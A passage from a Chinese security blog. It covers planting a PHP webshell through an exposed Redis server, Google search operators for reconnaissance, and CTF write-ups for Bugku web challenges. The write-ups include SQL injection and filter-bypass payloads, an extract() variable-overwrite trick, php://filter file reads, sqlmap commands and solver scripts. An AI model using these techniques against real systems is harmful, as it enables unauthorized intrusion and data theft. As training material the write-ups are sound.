+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/   //目标的网站根目录</span><br><span class="line">config set dbfilename shell.php     //修改备份RDB文件名为shell.php</span><br><span class="line">set aaa &quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>任意set一个变量aaa的值为”&lt;?php phpinfo(); ?&gt;”,即可对目标服务器getshell</p>
+<p>参考链接：<br>离别歌 <a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html</a></p>
+<p>知乎<br><a href="https://zhuanlan.zhihu.com/p/36529010" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36529010</a> </p>
+<p>csdn<br><a href="https://blog.csdn.net/u011721501/article/details/45157399" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/45157399</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-google hack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/21/google hack/" class="article-date">
+  	<time datetime="2019-03-21T11:58:59.313Z" itemprop="datePublished">2019-03-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Google-Hack-语法"><a href="#Google-Hack-语法" class="headerlink" title="Google Hack 语法"></a>Google Hack 语法</h2><h5 id="最近才知道搜索是有语法规则的，这里记录下方便回顾"><a href="#最近才知道搜索是有语法规则的，这里记录下方便回顾" class="headerlink" title="最近才知道搜索是有语法规则的，这里记录下方便回顾"></a>最近才知道搜索是有语法规则的，这里记录下方便回顾</h5><h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h3><p>搜索我们指定的字符是否存在于URL中</p>
+<p>例如输入:inurl:php?id=,将返回N个类似于这样的连接:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/xxx.php?id=xxx</span><br></pre></td></tr></table></figure></p>
+<h4 id="intext"><a href="#intext" class="headerlink" title="intext:"></a>intext:</h4><p>把网页中的正文内容中的某个字符做为搜索条件</p>
+<p>例如在google里输入 intext:公司.将返回所有在网页正文部分包含”公司”的网页.allintext:使用方法和intext类似.</p>
+<h4 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h4><p>搜索网页标题中包含有特定字符的网页。</p>
+<p>例如输入“intitle: cba”，这样网页标题中带有cba的网页都会被搜索出来。</p>
+<h4 id="Filetype"><a href="#Filetype" class="headerlink" title="Filetype:"></a>Filetype:</h4><p>搜索指定类型的文件。</p>
+<p>例如输入“filetype:cba”，将返回所有以cba结尾的文件URL</p>
+<h4 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h4><p>搜索google里关于某些内容的缓存</p>
+<h4 id="Site"><a href="#Site" class="headerlink" title="Site:"></a>Site:</h4><p>找到与指定网站有联系的URL</p>
+<p>例如输入“Site：family.chinaok.com”。所有和这个网站有联系的URL都会被显示。</p>
+<h4 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h4><p>查找指定站点的一些基本信息</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-lun web" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/20/lun web/" class="article-date">
+  	<time datetime="2019-03-20T08:43:57.214Z" itemprop="datePublished">2019-03-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="CTF-论剑场"><a href="#CTF-论剑场" class="headerlink" title="CTF - 论剑场"></a>CTF - 论剑场</h2><h3 id="闲来无事，做会题目-持续更新"><a href="#闲来无事，做会题目-持续更新" class="headerlink" title="闲来无事，做会题目(持续更新)"></a>闲来无事，做会题目(持续更新)</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$b = &apos;ssAEDsssss&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    $c =trim(file_get_contents($b));</span><br><span class="line">    if($a==$c)&#123;</span><br><span class="line">        echo $myflag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;继续努力，相信flag离你不远了&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<p>考察变量覆盖漏洞extract() : 从数组中将变量导入到当前的符号表</p>
+<p>payload: a=&amp;b=</p>
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><img src="https://s2.ax1x.com/2019/04/04/AgIgFU.jpg" alt="image"></p>
+<p>是个计算题，要求在三秒钟内算出来，明显写脚本跑</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://123.206.31.85:10002/&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">res = r.get(url)</span><br><span class="line"># print response.text</span><br><span class="line">text = res.text</span><br><span class="line">cal = re.findall(&quot;(.*?)&lt;/p&gt;&quot;,text) #非贪婪算法</span><br><span class="line"># print str(cal)[3:-2]</span><br><span class="line">ans = eval(str(cal)[3:-2])</span><br><span class="line"># print ans</span><br><span class="line">data = &#123;&apos;result&apos;:ans&#125;</span><br><span class="line">res0 = r.post(url,data=data)</span><br><span class="line">print res0.text</span><br></pre></td></tr></table></figure>
+<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><ul>
+<li>考点 : php伪协议<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>考察万能密码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1 #</span><br></pre></td></tr></table></figure></p>
+<p>写了一下后台代码原理大致如下，亲测有效:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  $servername = &apos;127.0.0.1&apos;;</span><br><span class="line">  $username = &apos;root&apos;;</span><br><span class="line">  $password = &apos;root&apos;;</span><br><span class="line">  $dbname = &apos;code&apos;;</span><br><span class="line"></span><br><span class="line">  @$con = mysql_connect($servername,$username,$password);</span><br><span class="line"></span><br><span class="line">  if(!$con)&#123;</span><br><span class="line">    die(&apos;Failed to connect to Mysql&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  mysql_select_db($dbname) or die(&apos;failed to connect to dbname:$dbname&apos;);</span><br><span class="line">  $username = $_POST[&apos;username&apos;];</span><br><span class="line">  $password = $_POST[&apos;password&apos;];</span><br><span class="line">  $sql = &quot;select * from user where username= &apos;$username&apos; and password = &apos;$password&apos;&quot;;</span><br><span class="line">  echo $sql;</span><br><span class="line">  $res = mysql_query($sql);</span><br><span class="line">  $row = mysql_fetch_array($res);</span><br><span class="line">  if($row)&#123;</span><br><span class="line">   	echo &quot;success&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">   	echo &quot;failed&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>sqlmap -u “地址” -v 3 –dbs</p>
+<p>-v 3 可以看到payload</p>
+<p>–tables –columns </p>
+<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message bugku then you can get the flag</span><br></pre></td></tr></table></figure>
+<p>curl -X PUT “地址” -d “bugku”</p>
+<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>robots.txt下发现shell.php<br><img src="https://s2.ax1x.com/2019/04/03/Ac29MT.jpg" alt="image"><br>md5截断验证<br>这里采用短时间生成大量MD5，牺牲空间来换取时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">sum = []</span><br><span class="line">j = 0</span><br><span class="line">f = open(&quot;gen_md5.txt&quot;, &quot;a&quot;)</span><br><span class="line">for i in xrange(10000000):</span><br><span class="line">    tmp = (hashlib.md5(str(i)).hexdigest(),i)</span><br><span class="line">    sum.append(tmp)</span><br><span class="line">    # print sum</span><br><span class="line">    j = j+1</span><br><span class="line">    if(j==10000000):</span><br><span class="line">        # print sum</span><br><span class="line">        for i in sum:</span><br><span class="line">            f.write(&quot;&#123;0&#125;&#123;1&#125;&quot;.format(i,&quot;\n&quot;))</span><br><span class="line">        j=0</span><br><span class="line">        sum = []</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
+<p>然后再执行匹配命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat gen_md5.txt|grep \(\&apos;str  //str是题目</span><br></pre></td></tr></table></figure></p>
+<h3 id="web17-流量分析"><a href="#web17-流量分析" class="headerlink" title="web17 流量分析"></a>web17 流量分析</h3><p>用wireshark追踪TCP流即可看见flag</p>
+<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>是个sql绕过注入</p>
+<p><img src="https://s2.ax1x.com/2019/04/04/Ag4WAU.jpg" alt="image"></p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata --+</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() aandnd table_name = &apos;flag&apos; --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,flag,3 from flag --+</span><br></pre></td></tr></table></figure>
+<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你的动态密文是：4803baa775dc5841bf99fae420c1a7688</span><br><span class="line">GET提交对应的密文可以得到flag(form_input_name=&apos;key&apos;)</span><br><span class="line">输出格式：&apos;flag&#123;....&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>写个脚本多运行几次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.31.85:10020/&quot;</span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).content</span><br><span class="line"></span><br><span class="line">key = re.findall(r&quot;[0-9a-z]+&quot;,text)[0]</span><br><span class="line">url1 = url + &quot;?key=&quot; + key</span><br><span class="line">res = r.get(url1).content</span><br><span class="line">print res</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
